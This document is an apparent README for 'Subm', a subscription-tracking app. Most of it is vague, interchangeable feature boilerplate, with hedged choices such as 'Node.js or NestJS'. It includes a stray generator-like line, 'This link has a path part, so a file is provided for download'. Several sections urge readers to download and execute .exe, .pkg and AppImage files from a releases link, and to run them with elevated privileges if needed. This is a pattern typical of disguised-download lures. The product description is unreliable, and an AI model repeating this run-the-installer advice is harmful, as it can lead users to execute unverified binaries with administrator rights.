# Subm: Modern Subscription Manager to Track Fees and Renewals

[![Release](https://img.shields.io/badge/Downloads-Release-blue?logo=github&logoColor=white)](https://github.com/julixxcode/subm/releases)

<svg width="1000" height="240" viewBox="0 0 1000 240" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Subm cover illustration">
  <defs>
    <linearGradient id="g" x1="0" x2="1" y1="0" y2="1">
      <stop stop-color="#4F46E5" offset="0"/>
      <stop stop-color="#06B6D4" offset="1"/>
    </linearGradient>
  </defs>
  <rect x="0" y="0" width="1000" height="240" fill="url(#g)"/>
  <g fill="white" opacity="0.9">
    <rect x="40" y="40" width="180" height="160" rx="12"/>
    <rect x="240" y="80" width="90" height="80" rx="10" opacity="0.9"/>
    <rect x="360" y="60" width="120" height="40" rx="8" opacity="0.7"/>
    <rect x="360" y="110" width="120" height="40" rx="8" opacity="0.9"/>
  </g>
  <g fill="#ffffff" stroke="none" transform="translate(520,120)">
    <circle r="40" fill="rgba(255,255,255,0.25)"/>
    <path d="M-20,-4 h40 v-4 h-40 z" fill="white" opacity="0.8"/>
    <path d="M-14,14 h28 v-2 h-28 z" fill="white" opacity="0.8"/>
  </g>
  <text x="50" y="210" font-family="Arial, Helvetica, sans-serif" font-size="40" fill="white" opacity="0.95">Subm</text>
</svg>

Table of contents
- Overview
- Why Subm
- Core features
- Architecture and design
- Data model
- Tech stack
- Getting started
- Installation from releases
- How to use
- UI and user flows
- Automation and notifications
- Security and privacy
- Testing and quality
- Deployment and hosting
- Localization and accessibility
- Performance and reliability
- Roadmap
- Contributing
- Community and support
- FAQ
- License and credits

Overview
Subm is a modern subscription manager designed to help people and teams handle the costs and renewal dates of multiple services in one place. It offers a clean interface, quick setup, and precise tracking. The goal is to give you a clear view of every active subscription, its next renewal date, current price, billing cadence, payment status, and whether you are getting value from the service. Subm focuses on clarity, reliability, and privacy. It avoids clutter and focuses on the core tasks: track, alert, and optimize.

Subm helps you answer the core questions:
- What subscriptions do I have?
- When is the next renewal and what will the price be?
- How much am I spending each month and per year?
- Which subscriptions are auto-renewing, and which require action?
- Are there opportunities to save by switching plans, downgrading, or canceling?

The project aims to be accessible to individuals and teams. It supports personal use out of the box and scales to small businesses that need shared visibility across departments. Subm is designed to integrate with existing tools. It uses a modular approach so you can implement only what you need, then add more modules as your needs grow.

Why Subm
Managing subscriptions can be tedious. Small fees add up quickly. Renewal dates slip. Invoices arrive in silos. People lose track of what is active and what is not. Subm solves these issues by offering:
- A single source of truth for subscriptions
- Clear, actionable renewal reminders
- Flexible categories and labels for easy grouping
- Simple budgeting views to understand expenses
- A fast, responsive interface that works on desktop and mobile
- Strong data handling with robust export options

Subm is built with a pragmatic mindset. It avoids heavy processes that slow you down. It emphasizes practicality: it helps you stay on top of spend, plan ahead, and reduce wasted money. The design process focused on reducing cognitive load. The result is a tool that is easy to adopt, yet powerful enough to handle complex subscription ecosystems.

Core features
- Subscriptions catalog: Manage all services, with service name, account, plan, price, currency, renewal cadence, and renewal date.
- Renewal tracking: Alerts for upcoming renewals, price changes, and contract terminations.
- Budgeting and reporting: Monthly, quarterly, and yearly spend summaries; trend analysis over time.
- Payment status: Track receipts, payment methods, and last payment status to avoid gaps.
- Consolidated invoices: Import or attach invoices to subscriptions for quick reference.
- Tags and categories: Flexible labeling for teams and personal use to group by department, project, or vendor.
- Notifications: Email and in-app reminders for renewals and price changes.
- Data export: Export data to CSV, JSON, or XML for reporting and backup.
- Sync and import: Import data from CSV or external sources; support for common formats.
- Cross-platform access: Web UI, with optional mobile apps for iOS and Android.
- Security and privacy: Strong authentication, role-based access, and encryption at rest and in transit.
- API: A RESTful or GraphQL API to integrate with other tools.
- Localization: Multiple languages and date formats for global use.
- Accessibility: Keyboard navigation, screen reader friendly, high-contrast options.

Architecture and design
Subm follows a modular design to keep the system maintainable and extensible. The core is a clean data model and a service layer that handles business rules. The UI is decoupled from data access, which makes it easy to evolve the interface without breaking the backend.

- Data-first core: The data model centers on subscriptions, services, plans, owners, and billing events. The domain model is designed to be explicit and predictable.
- Service layer: Business rules live in services. This keeps business logic out of the UI and makes testing straightforward.
- API surface: A stable API surface with versioning ensures compatibility as features evolve.
- Frontend: A modern frontend with a responsive layout, accessible forms, and consistent navigation. It uses a component-based approach to promote reuse.
- Backend: A robust server that handles authentication, authorization, data validation, and reliable storage. It is designed to handle concurrent users and secure data handling.
- Data storage: A relational database powers the core data with careful indexing to optimize queries and reports. Data integrity and consistency are priorities.
- Observability: Logging, metrics, and traces are in place to diagnose issues quickly. The system provides dashboards for performance and reliability.
- Security: The architecture emphasizes secure defaults, encrypted connections, and careful permission handling to minimize risk.

Data model
- User: Represents a person who has access to Subm. Attributes include user ID, name, email, roles, and preferences.
- Organization/Team: For collaborative usage, an organization or team model allows multiple users to share visibility.
- Service: The vendor or product category. Attributes include name, vendor, category, color tag, and default currency.
- Subscription: The central entity. Attributes include id, user reference, service reference, plan, price, currency, cadence (monthly, yearly), start date, renewal date, status, and notes.
- Plan: Specific tier of a service with price, trial period, features, and renewal terms.
- RenewalEvent: A record of a renewal or price change; stores date, expected amount, and status.
- Invoice/Receipt: Attachments or references to external invoices; store file metadata and storage location.
- PaymentMethod: Payment details for reference (tokenized or last four digits only, as applicable).
- Tag: Flexible labels for organization and filtering.
- AuditLog: Tracks changes for compliance and auditing.

Tech stack
- Frontend: TypeScript, React, Redux or Context API, and a strong focus on accessibility.
- Backend: Node.js or NestJS, with clean architecture and modular services. Optional GraphQL layer.
- Database: PostgreSQL with well-defined schemas and migrations.
- Cache: Redis for caching frequently used queries and session data.
- Search: Lightweight search or full-text search for quick lookup, if needed.
- Authentication: OAuth2 or JWT-based authentication, with refresh tokens and short-lived access tokens.
- Payments: Optional Stripe integration for billing and receipts.
- Hosting: Containerized deployment with Docker; scalable via Kubernetes or a simpler orchestrator.
- CI/CD: Automated pipelines for build, test, and deployment.

Getting started
This section covers how to get Subm up and running on your workstation. The goal is to be fast and practical. You can start with a minimal setup and gradually add features.

Prerequisites
- Node.js version 18+ or the required runtime for your backend
- PostgreSQL 12+ with a dedicated database
- Docker and Docker Compose for local development (optional but recommended)
- Git for version control
- A modern web browser for the frontend (Chrome, Edge, or Firefox)

Quick start
- Clone the repository
- Install dependencies
- Set up the database
- Run the development server
- Open the app and sign in with a test account

Installation from releases
Since Subm ships binaries and install packages from Releases, you should grab the appropriate asset for your platform and run it. From the Releases page, download one of these files and execute it:

- Windows: subm-windows-setup.exe
- macOS: subm-macos-installer.pkg
- Linux: subm-linux-x86_64.AppImage

These files are published on the Releases page. The link to the releases is provided again here for convenience: https://github.com/julixxcode/subm/releases

Note: This link has a path part, so a file is provided for download. Use the specified assets to install Subm on your device. If you cannot locate the assets, check the Releases section for the latest build. You can also visit the link to view all assets and checksums.

If you prefer a guided path, use the following steps:
- On Windows: run the downloaded executable and follow the on-screen prompts. Allow the installer to set up the necessary services and create a local database if prompted.
- On macOS: run the PKG installer and authorize the installation. The installer will place the app in the /Applications folder and configure a local data directory.
- On Linux: make the AppImage executable with chmod +x subm-linux-x86_64.AppImage, then run it. The AppImage bundles the runtime, so you do not need a separate install.

If you run into permission issues, run the installer or AppImage with elevated privileges as required by your platform. Verify the integrity of the downloaded files if a checksum is provided on the Releases page. The checksums help ensure you received the exact artifact published by the maintainers.

Usage
Once installed, Subm presents a clean initial layout with a dashboard that summarizes your subscription portfolio. The dashboard is designed to be informative at a glance and supportive of deeper dives when needed.

- Dashboard overview: A high-level view of active subscriptions, upcoming renewals, expected costs, and notable changes.
- Subscriptions list: A table with filter, sort, and search capabilities. Each row displays key details such as service name, plan, price, cadence, renewal date, status, and owner.
- Details panel: When you select a subscription, a panel reveals all relevant data: invoices, notes, attached receipts, renewal history, and upcoming actions.
- Budget and trends: A dedicated view to explore historical spend, forecast, and trends to help you plan for renewal cycles.
- Alerts and reminders: Users receive reminders by email or within the app about upcoming renewals, price changes, or contract renewals.
- Reports: Quick export options for monthly spend, renewal by vendor, and category-level summaries.
- Import and export: Import data from CSV with mapping for columns. Export data for sharing or backup.

UI and user flows
Subm focuses on a smooth and predictable user experience. The UI emphasizes clarity, responsiveness, and consistency. The layout centers on efficiency, with a persistent top bar, a side navigation rail, and context-aware panels.

- Onboarding: A concise setup wizard guides you through adding your first subscription, defining your currency, and connecting a data source if needed.
- Subscriptions management: Create, edit, or delete subscriptions with inline editing. Use tags to group by department, vendor, or project.
- Notifications: Configure reminder preferences per user or per team. Choose channels and timing to align with workflows.
- Data views: Switch between list view, grid view, or calendar-like views for renewal planning.
- Accessibility: All interactive elements are labeled for screen readers. Keyboard navigation is supported across common actions.

Automation and notifications
Subm includes automation hooks to save time and reduce manual work.

- Scheduling: Renewals trigger reminders ahead of time. You choose the horizon: days, weeks, or months.
- Price tracking: The system can monitor price changes and notify you when a subscription is likely to increase.
- Payments and receipts: Attach invoices and track receipts automatically when payments are processed.
- Integrations: Webhooks or API endpoints to connect Subm with finance systems, CRM, or ticketing tools.
- Data integrity: Validation rules run on the client and on the server to prevent inconsistent records.

Security and privacy
- Access control: Role-based access with fine-grained permissions. Admins can manage teams and user accounts.
- Data in transit: All traffic uses TLS encryption. Certificates are rotated regularly.
- Data at rest: Sensitive data is encrypted in storage. Personal data is minimized and protected.
- Secrets management: API keys and tokens are stored securely with proper rotation policies.
- Audit trails: All changes are logged with timestamps, user IDs, and a description of the action.
- Compliance: Design aligns with common privacy and security best practices. You can configure data retention policies.

Testing and quality
- Unit tests: Core modules have unit tests to validate business rules and edge cases.
- Integration tests: Inter-service tests ensure proper data flow across layers.
- End-to-end tests: Automated tests simulate real user interactions to validate critical paths.
- Accessibility tests: ARIA roles and keyboard navigation are verified.
- Performance tests: Load tests and stress tests ensure the app remains responsive under heavier usage.

Deployment and hosting
- Local development: Run the frontend and backend locally, with an embedded database for testing.
- Staging: A staging environment mirrors production for QA and user acceptance testing.
- Production: A production deployment uses containerized services with a managed database and scalable storage.
- Observability: Dashboards for error rates, latency, CPU usage, memory, and I/O.

Localization and accessibility
- Localization: Language packs cover major locales. Dates and currencies adapt to user preferences.
- Accessibility: Keyboard friendly, screen reader friendly, high-contrast mode, and visible focus indicators.
- Internationalization: Strings and labels can be translated without code changes.

Performance and reliability
- Caching: Frequently accessed data is cached to improve response times.
- Indexing: Database indexes optimize queries, especially for renewal views and reports.
- Backups: Regular backups and tested restore processes are in place.
- Failover: Redundancy strategies and health checks keep the service available.

Roadmap
- Expand API surface to support more third-party integrations.
- Add more vendor-specific fields to help with contract management.
- Improve analytics with predictive renewal insights.
- Introduce a mobile-first companion app with offline support.
- Enhance import from external billing systems.

Contributing
- Welcome: Subm invites contributions from developers of all levels.
- How to contribute: Start with a good issue or create a feature branch. Follow the project’s coding standards.
- Code style: Consistent naming, clear function boundaries, and thorough tests.
- Testing: Run unit tests locally to verify changes before pushing.
- Documentation: Update or add docs as new features are introduced.
- Issues and discussions: Use the issue tracker to report bugs or propose enhancements. For design questions, start a discussion thread.

Community and support
- Community channels: A discussion board and chat are available for users and contributors.
- Support: If you need help, use the issue tracker for bug reports or feature requests. For urgent support, share logs and a precise description of the problem.
- Documentation: The README, developer docs, and API reference pages provide guidance and examples.

FAQ
- Is Subm free to use? Subm offers a core set of features and optional paid enhancements. The licensing terms are published in the license section.
- Does Subm support multiple currencies? Yes, Subm supports multiple currencies and localizes formats for amounts and dates.
- How do I add a new subscription? Use the Add button in the Subscriptions view, fill in required fields, and save. You can attach invoices and notes.
- How do I import existing data? Use the Import tool and map your columns to Subm fields. You can verify data after the import.
- Can I customize notifications? Yes, you can customize channels, timing, and recipients per user or team.
- Is there an offline mode? A basic offline capability is available in certain builds with local caching. Full offline support may require additional configuration.
- How is data secured? Subm uses TLS for data in transit and encryption at rest for sensitive data. Access control prevents unauthorized actions.
- What happens if a subscription price changes? Subm records the change and notifies the responsible users. You can review price history in the details panel.
- How do I request a feature? Open an issue and describe the use case, expected outcome, and any dependencies.

License and credits
Subm is released under a permissive license that encourages reuse and collaboration. The license terms define what you can do with the source code, how attribution works, and how to handle derivative works. Credits go to the contributors who have helped build Subm, and the project acknowledges third-party libraries and services used in the implementation.

Changelog philosophy
- We maintain a concise changelog for each release to help users understand what changed.
- Each release entry includes a summary, a list of new features, fixes, and any breaking changes.
- If a change affects configuration or usage, the release notes provide guidance for migration.

Code of conduct
Subm welcomes diverse contributors. We expect respectful collaboration and clear communication. The code of conduct outlines expectations for behavior and how to report concerns.

Data migration
- When updating, Subm provides migration scripts to adapt to changes in the data schema.
- Backups are recommended before applying migrations.
- Migration notes explain how data transforms during upgrades.

Security best practices
- Use strong authentication methods and rotate credentials regularly.
- Validate data from external sources to prevent injection or data corruption.
- Review dependencies for known vulnerabilities.
- Keep your deployment environment up to date with security patches.

Accessibility considerations
- Keyboard focus structures are well defined.
- Labels and placeholders describe form fields clearly.
- Visual components use high-contrast colors and scalable typography.
- Error messages are actionable and visible.

Internationalization and localization details
- Date, time, and number formats align with the user’s locale.
- Translations are maintained in a dedicated directory.
- Language switching is immediate and non-disruptive.

Developer guide
- Project structure: The codebase is organized into modules representing core domains.
- How to contribute: Start with small issues to learn the codebase, then take on more complex tasks.
- Testing approach: A mix of unit, integration, and end-to-end tests ensures reliability.
- Build process: The build pipeline compiles assets and prepares deployment artifacts.
- API usage: The API provides clear endpoints and consistent response formats.
- Data models: The domain model is documented with relationships and constraints.

User experience notes
- The UI emphasizes quick actions and fast navigation.
- Important actions require confirmation prompts but are designed to be predictable.
- Tooltips and inline help reduce friction for new users.

Localization strategy
- Strings are externalized to enable translation without code changes.
- Locale-aware formatting ensures comfortable user experiences worldwide.
- The user can switch languages from the settings panel at any time.

Observability and metrics
- The system reports error rates and response times.
- Dashboards show resource usage and performance trends.
- Alerts are configured for critical incidents and outages.

Backup and recovery
- Regular backups are scheduled with retention policies.
- Restore procedures are documented and tested in a safe environment.
- Data integrity checks run periodically to detect anomalies.

Third-party integrations
- Subm supports a selection of common services for import, export, and automation.
- Integrations are built as pluggable modules to minimize coupling.
- Each integration includes a test suite and simulated data for safe testing.

Localization of assets
- Screenshots and UI assets can be localized for different languages.
- The assets directory contains language-specific resources and images.

Roadmap details
- In the near term, we plan to enhance calendar views for renewal planning.
- We will expand the API with more endpoints for automation and reporting.
- We aim to improve the import experience with better mapping and validation.
- We will explore offline scenarios and data synchronization strategies.

Release process
- Each release includes a changelog, migration notes, and upgrade instructions.
- Pre-release builds may be available for testing with feature flags.
- Release notes emphasize breaking changes to help teams plan migrations.

Community guidelines
- Respect code of conduct and keep discussions focused.
- Pull requests include tests and documentation updates.
- Reviews emphasize constructive feedback and timely responses.

How to run a local instance
- Start the database and services with your preferred toolchain.
- Configure environment variables for database connection, API keys, and hostnames.
- Run the frontend and backend servers.
- Access the app in your browser and sign in with a test account.

Data export formats
- CSV: Simple tabular data suitable for import by spreadsheets.
- JSON: Structured data suitable for programmatic use.
- XML: For legacy integrations with older systems.
- PDF: For printable reports and summaries.

Data privacy and retention
- You can configure retention policies for data, including how long to keep logs and records.
- Sensitive data handling follows best practices for privacy and security.
- Data deletion requests are processed promptly with a clear audit trail.

Troubleshooting
- Common issues include connection errors, missing assets, and authentication failures.
- Check logs for error messages and verify environment configuration.
- If issues persist, reach out to the community or file an issue with a detailed report.

Contribution guidelines in detail
- Start by reading the CONTRIBUTING.md file to understand the project’s policies.
- Propose changes with a focused summary and a clear motivation.
- Provide tests that cover the new behavior or fix.
- Update documentation to reflect changes and new features.
- Engage with reviewers and address feedback promptly.

End-user onboarding
- A guided onboarding walks new users through adding the first subscription.
- It introduces key concepts like cadence, renewal dates, and budgets.
- It sets up a basic notification preference to help users stay informed.

Developer onboarding
- A dedicated guide to setting up a development environment.
- An overview of the repository layout and key modules.
- A checklist for getting the first feature merged.

Data migration notes
- Migration scripts handle changes in schema without data loss where possible.
- Each migration includes an explanation of the change and its impact.
- In case of potential data loss, the migration creates backups and provides recovery steps.

API reference
- Endpoints for subscriptions, services, plans, and invoices.
- Authentication methods and token management.
- Example requests and responses for common tasks.

Security incident response
- A defined process for reporting and handling security incidents.
- Steps for triage, containment, eradication, and recovery.
- Communication guidelines for responsible disclosure.

End with a note about releases
- The Releases page hosts build artifacts and installers for different platforms.
- If you need a specific asset, check the linked page for the latest version and download options.
- For more details on assets and checksums, visit the Releases section on the repository.

Releases
The Releases page contains the official installables and updates. If you want to see the latest builds, open https://github.com/julixxcode/subm/releases to review assets and download the appropriate file. This link has a path part, so you should download the indicated file and execute it on your platform:
- Windows: subm-windows-setup.exe
- macOS: subm-macos-installer.pkg
- Linux: subm-linux-x86_64.AppImage

Want to verify the integrity of a download? The Releases section often provides checksums. Use them to confirm the file you downloaded matches the published artifact. If you cannot locate the artifacts for your platform, return to the Releases page and view the latest build. The page is the single source of truth for installation media and upgrade instructions. For convenience, you can visit the Releases page again via https://github.com/julixxcode/subm/releases to review all assets and any post-release notes that describe improvements and fixes.

End of document.